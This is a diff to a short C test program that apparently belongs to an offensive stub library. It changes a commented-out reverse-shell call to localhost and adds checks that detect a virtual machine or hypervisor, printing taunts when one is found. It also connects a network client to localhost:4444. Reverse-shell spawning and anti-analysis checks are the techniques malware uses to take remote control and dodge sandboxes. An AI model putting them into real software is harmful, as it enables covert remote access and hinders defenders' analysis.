@@ -17,10 +17,18 @@
 
 #include <stdio.h>
 #include <string.h>
+#include <stdbool.h>
 #include "include/stub/net.h"
+#include "include/stub/re.h"
 int main(){
-  //shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
+  //shell_spawn_reverse_tcp("127.0.0.1", 6666, SHELL_BASH, SHELL_ASYNC_TRUE);
   //printf("breakpoints: %d\n", re_breakpoints());
+  if (re_kernel_modules() == true){
+    printf("stop using a VM!\n");
+  }
+  if (re_hypervisor() == true){
+    printf("stop using a hypervisor!\n");
+  }
   net_client("127.0.0.1", 4444);
   return 0;
 }
